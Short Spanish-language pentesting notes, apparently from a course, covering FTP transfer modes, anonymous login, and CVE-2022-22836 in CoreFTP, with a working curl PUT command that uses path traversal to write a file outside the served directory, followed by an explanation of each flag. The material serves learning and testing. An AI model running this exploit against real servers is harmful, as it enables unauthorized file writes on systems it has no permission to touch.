FTP modes: al acceder a FTP, el modo por defecto suele ser ASCII, útil para descargar texto y scripts. Para binarios, imágenes, comprimidos o ficheros inusuales, cambia a modo binario con bin antes de descargar.

# password: anonymous

Vulnerabilidad de FTP Moderna

CoreFTP before build 727vulnerabilidad CVE-2022-22836 . Esta vulnerabilidad afecta a un servicio FTP que no procesa correctamente la HTTP PUTsolicitud y genera una vulnerabilidad de tipo authenticated directory/ path traversal,y arbitrary file write. Esta vulnerabilidad permite escribir archivos fuera del directorio al que el servicio tiene acceso.

Explotación de CoreFTP

Explotación de CoreFTP

curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops

Creamos una PUTsolicitud HTTP sin procesar ( -X PUT) Autenticación básica ( --basic -u <username>:<password>) Ruta del archivo ( --path-as-is https://<IP>/../../../../../whoops) Contenido ( --data-binary "PoC.") Host ( -H "Host: <IP>") con la dirección IP de nuestro sistema de destino.
